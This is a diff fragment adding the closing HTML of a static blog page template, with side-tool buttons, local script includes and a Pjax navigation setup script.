+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="unfolded-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-expand-width flex-center">
+            <i class="fa-regular fa-expand"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="folded-tools-list">
+        <li class="right-bottom-tools tool-toggle-show flex-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/layouts/menu-shrink.js"></script>
+
+<script src="/js/tools/go-top-bottom.js"></script>
+
+<script src="/js/tools/dark-light-toggle.js"></script>
+
+
+
+
+
+    
+<script src="/js/tools/code-block.js"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/layouts/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js"></script>
+
+
+
+
+
+
+
+<div class="post-scripts pjax">
+    
+        
+<script src="/js/tools/toc-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/layouts/toc.js"></script>
+
+<script src="/js/plugins/tabs.js"></script>
+
+    
+</div>
+
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            REDEFINE.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            REDEFINE.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            REDEFINE.refresh();
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
